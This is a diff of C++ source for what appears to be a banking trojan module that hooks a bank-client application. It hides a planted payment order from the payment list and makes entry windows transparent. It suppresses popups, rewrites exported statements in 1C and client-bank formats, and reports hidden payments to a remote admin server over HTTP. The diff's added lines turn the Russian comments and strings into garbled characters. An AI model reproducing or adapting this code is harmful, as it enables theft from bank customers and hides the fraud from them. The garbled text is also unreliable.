+	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "namesend", 93, 133, 234, 25, 0,                   0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅ
+	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* пїЅпїЅпїЅ */, 0, 0x5E9D34F9 /* button */}, //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0, 0x5E9D34F9 /* button */}, //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0, 0x5E9D34F9 /* button */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{ 0 }
 };
 
-//описание окна подтверждения после нажатия кнопки Доставка
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 ControlForm formConfirmation =
 {
-	0, 0, 0, 0, 0, "Информация об отправляемых документах", 0x7DE3292D, "VControl", 0
+	0, 0, 0, 0, 0, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0x7DE3292D, "VControl", 0
 };
 
-//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ wnd пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ControlFinded, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ true
 static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );
 
 static void SendLogToAdmin( int num, const char* text = 0 )
@@ -214,7 +225,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	const char *paramText;
 	char empty[1], *valText;
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	if( text && text[0] ) //не пустая строка
+	if( text && text[0] ) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		paramText = "&text=", valText = URLEncode((char*)text);
 	}
@@ -225,7 +236,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
-	DBGRAFA( "Rafa", "Отсылка лога: %s, text=%s", (char*)qr, text );
+	DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %s, text=%s", (char*)qr, text );
 	HTTPResponse::Clear(&Response);
 }
 
@@ -235,7 +246,7 @@ struct LogInfo
 	char text[768];
 };
 
-// Функция отправляет лог в отдельном потоке
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI SendLogToAdminThread2( LPVOID p )
 {
 	LogInfo* p2 = (LogInfo*)p;
@@ -264,7 +275,7 @@ static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
 	return 0;
 }
 
-//обновляет значения строк после операции сортировки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void UpdateParamAfterSort()
 {
 	LVITEM item;
@@ -285,13 +296,13 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 	bool update = false;
 	switch ( Msg )
 	{
-		// весь остальной текст в том числе и из EDIT (в правом нижнем углу)
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ EDIT (пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ)
 		case WM_SETTEXT:
 			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
 			GrabBalansFromMemoText((char*)lParam);
 		break;
 
-		// для дерева добавление item
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ item
 		case TVM_INSERTITEM:
 		{
 			/*
@@ -304,7 +315,7 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			*/
 			break;
 		}
-		// для дерева модификация item
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ item
 		case TVM_SETITEM:
 		{
 			/*
@@ -318,7 +329,7 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			break;
 		}
 
-		// для таблицы добавление item
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ item
 		case LVM_INSERTITEM:
 		{
 			LPLVITEM item = (LPLVITEM)lParam;
@@ -328,13 +339,13 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			{
 				//DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
 			}
-			//строим таблицу порядка отображаемых строк
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			begHideRows = c_lvRows = item->iItem + 1;
-			paramRows[item->iItem] = item->lParam; //по этому параметру извлекаются данные, а не по номеру строки
+			paramRows[item->iItem] = item->lParam; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			//DBGRAFA( "Rafa", "Insert %d %08x", item->iItem, item->lParam );
 			break;
 		}
-		// для таблицы  модификация item
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ item
 		case LVM_SETITEM:
 		{
 			LPLVITEM item  = (LPLVITEM)lParam;
@@ -411,7 +422,7 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 					case LVN_GETDISPINFO:
 					{
 						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
-						//подставляем нужный параметр
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						paramOrig = p->item.lParam;
 						numItem = p->item.iItem;
 						p->item.lParam = paramRows[p->item.iItem];
@@ -427,7 +438,7 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 							return 0;
 						else
 							p->lParam = paramRows[p->iItem];
-						if( idBtDelivery == 0 ) //для поиска кнопки Доставка, не всегда ее можно найти при старте
+						if( idBtDelivery == 0 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 							FindTreeList();
 					}
 					break;
@@ -443,10 +454,10 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 							NMMOUSE* p = (NMMOUSE*)lParam;
 							if( p->dwItemSpec == idBtDelivery )
 							{
-								DBGRAFA( "Rafa", "Нажата кнопка Доставка" );
+								DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 								if( offBtDelivery )
 								{
-									pMessageBoxA( 0, prophylaxisText, "Внимание!", MB_ICONWARNING );
+									pMessageBoxA( 0, prophylaxisText, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!", MB_ICONWARNING );
 									return 0;
 								}
 							}
@@ -462,8 +473,8 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 	{
 		case WM_NOTIFY:
 		{
-			//через сообщение LVN_GETDISPINFO ListView запрашивает данные для ячеек, в которых отображаются платежки
-			//здесь идентифицируем платежки которые нужно скрыть
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ LVN_GETDISPINFO ListView пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			NMHDR* pdi = (NMHDR*)lParam;
 			if( pdi->hwndFrom == listView )
 			{
@@ -476,29 +487,29 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 						{
 							switch( p->item.iSubItem )
 							{
-								case 5: //получатель
+								case 5: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									if( FindPaymentForIdent( p->item.pszText, 0 ) )
 										identHidePayment |= 1;
 									else
-										identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
+										identHidePayment = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									break;
-								case 4: //сумма
+								case 4: //пїЅпїЅпїЅпїЅпїЅ
 									if( FindPaymentForIdent( p->item.pszText, 1 ) )
 										identHidePayment |= 2;
 									else
 										identHidePayment = 0; 
 									break;
-								case 6: //назначение
+								case 6: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									if( FindPaymentForIdent( p->item.pszText, 2 ) )
 										identHidePayment |= 4;
 									else
 										identHidePayment = 0; 
 									break;
 							}
-							if( identHidePayment == fullIdent ) //наша платежка идентифицирована
+							if( identHidePayment == fullIdent ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							{
-								DBGRAFA( "Rafa", "Идентифицировали платежку %d", numItem );
-								//ищем индекс платежки в нашем массиве
+								DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d", numItem );
+								//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								int idx = -1;
 								for( int i = 0; i < c_lvRows; i++ )
 									if( paramRows[i] == paramOrig )
@@ -507,14 +518,14 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 										break;
 									}
 								DBGRAFA( "Rafa", "%d %08x", idx, paramOrig );
-								if( idx < begHideRows ) //платежка еще не скрыта
+								if( idx < begHideRows ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 								{
-									//переносим номер этой платежки в самый низ, остальные поднимаем выше
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 									for( int i = idx; i < c_lvRows - 1; i++ )
 										paramRows[i] = paramRows[i + 1];
 									begHideRows--;
 									paramRows[c_lvRows - 1] = paramOrig;
-									//если строка выделена, то сбрасываем выделение
+									//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									DWORD res = (DWORD)pSendMessageA( listView, LVM_GETITEMSTATE, (WPARAM)numItem, (LPARAM)LVIS_SELECTED );
 									if( res & LVIS_SELECTED )
 									{
@@ -531,8 +542,8 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 										pSendMessageA( listView, WM_NOTIFY, (WPARAM)0, (LPARAM)&nm );
 									}
 									pSendMessageA( listView, LVM_REDRAWITEMS, (WPARAM)0, (LPARAM)(c_lvRows - 1) );
-									SendLogToAdminThread(6); //сообщаем о скрытии платежки
-									//pUpdateWindow(listView); //обновляем таблицу
+									SendLogToAdminThread(6); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+									//pUpdateWindow(listView); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								}
 								identHidePayment = 0;
 							}
@@ -548,7 +559,7 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 						}
 						if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
 						{
-							if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
+							if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								ret = CDRF_SKIPDEFAULT;
 							else
 								ret = CDRF_NEWFONT;
@@ -570,22 +581,22 @@ static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, P
 	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
 	{
 		bool transparent = false;
-		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
+		if( (stateFakeWindow & 3) == 3 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			RECT r;
-			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //это окно Платёжное поручение
+			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				transparent = true;
-				stateFakeWindow &= ~2; //больше не нужно ждать это окно
+				stateFakeWindow &= ~2; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			}
 		}
 		else
-			if( (stateFakeWindow & 5) == 5 ) //во время ввода платежки, подавляем все всплывающие окна
+			if( (stateFakeWindow & 5) == 5 ) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			{
 				//DBGRAFA( "Rafa", "Window class: '%s', caption: '%s'", lpClassName, lpWindowName );
 				transparent = true;
 			}
-		if( transparent ) //делаем окно прозрачным
+		if( transparent ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 #ifdef DEBUGCONFIG
 			int v = (stateFakeWindow & 16) ? 0 : 50;
@@ -603,13 +614,13 @@ static BOOL WINAPI HandlerTrackPopupMenu( HMENU hMenu, UINT uFlags, int x, int y
 {
 	if( stateFakeWindow & 8 )
 	{
-		stateFakeWindow &= ~8; //меню вызвано
+		stateFakeWindow &= ~8; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return retMenuNds;
 	}
 	return pHandlerTrackPopupMenu( hMenu, uFlags, x, y, nReserved, hWnd, prcRect );
 }
 
-//функции CreateFileA, CloseHandle, WriteFile перехватываем для модификаци отчета по платежкам
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ CreateFileA, CloseHandle, WriteFile пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
 							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
 {
@@ -620,24 +631,24 @@ static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess
 		TypeFileReport type = ReportNothing;
 		if( m_strstr( lpFileName, "report.html") )
 		{
-			DBGRAFA( "Rafa", "Перехватили отчет InfoOperaions '%s'", lpFileName );
+			DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ InfoOperaions '%s'", lpFileName );
 			type = ReportInfoOperaions;
 		}
 		else
 			if( m_strstr( lpFileName, ".txt" ) )
 			{
-				DBGRAFA( "Rafa", "Перехватили файл txt '%s'", lpFileName );
+				DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ txt '%s'", lpFileName );
 				type = ReportTxt;
 			}
 			else
 				if( m_strstr( lpFileName, ".xml" ) )
 				{
-					DBGRAFA( "Rafa", "Перехватили файл xml '%s'", lpFileName );
+					DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ xml '%s'", lpFileName );
 					type = ReportXml;
 				}
 		if( type != ReportNothing )
 		{
-			//ложим открытый файл в свободную ячейку
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			for( int i = 0; i < maxFileReports; i++ )
 				if( fileReports[i].file == 0 )
 				{
@@ -655,24 +666,24 @@ static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess
 static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
 {
 	for( int i = 0; i < maxFileReports; i++ )
-		if( fileReports[i].file == hFile ) //перехватываемый отчет, пишем его в память
+		if( fileReports[i].file == hFile ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			DBGRAFA( "Rafa", "В отчет добавлено байт: %d, было %d", nNumberOfBytesToWrite, fileReports[i].len );
+			DBGRAFA( "Rafa", "пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d, пїЅпїЅпїЅпїЅ %d", nNumberOfBytesToWrite, fileReports[i].len );
 			fileReports[i].text = (char*)MemRealloc( fileReports[i].text, fileReports[i].len + nNumberOfBytesToWrite + 1 );
 			m_memcpy( fileReports[i].text + fileReports[i].len, lpBuffer, nNumberOfBytesToWrite );
 			fileReports[i].len += nNumberOfBytesToWrite;
 			fileReports[i].text[fileReports[i].len] = 0;
 			if( lpNumberOfBytesWritten )
 				*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
-			bool saved = false; //нужно ли сохранить файл, т. е. формат файла не наш
-			if( fileReports[i].type == ReportTxt ) //неизвестный текстовый файл
+			bool saved = false; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅ. пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
+			if( fileReports[i].type == ReportTxt ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			{
-				if( fileReports[i].len > 32 ) //достаточно данных для идентификации
+				if( fileReports[i].len > 32 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					if( m_strstr( fileReports[i].text, "1CClientBankExchange" ) ) //format 1C
 						fileReports[i].type = ReportFormat1C;
 					else
-						if( m_strstr( fileReports[i].text, "HEADER" ) && m_strstr( fileReports[i].text, "F00: " ) ) //формат клиент-банка
+						if( m_strstr( fileReports[i].text, "HEADER" ) && m_strstr( fileReports[i].text, "F00: " ) ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ
 							fileReports[i].type = ReportFormatClientBank;
 						else
 							saved = true;
@@ -680,15 +691,15 @@ static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumbe
 				}
 			}
 			else
-				if( fileReports[i].type == ReportXml ) //неизвестный xml файл
